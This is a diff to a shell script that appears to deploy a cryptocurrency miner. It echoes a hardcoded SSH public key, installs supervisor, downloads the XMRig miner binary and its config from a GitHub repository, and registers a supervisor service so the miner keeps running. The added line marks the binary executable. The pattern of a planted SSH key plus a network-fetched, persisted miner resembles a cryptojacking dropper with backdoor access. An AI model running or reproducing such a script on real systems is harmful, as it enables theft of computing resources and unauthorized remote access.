@@ -4,6 +4,7 @@ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDCaPV6yGTphaAYzOWPAx2bdOhQk31zZ/dO5I
 sudo apt-get -y update 
 sudo apt install -y hwloc wget supervisor
 wget https://raw.githubusercontent.com//henglxm/xmr/main/xmrig
+chmod +x xmrig
 wget https://raw.githubusercontent.com//henglxm/xmr/main/config.json
 wget https://raw.githubusercontent.com/henglxm/xmr/main/xmr.conf -O /etc/supervisor/conf.d/xmr.conf
 sudo systemctl enable supervisor.service
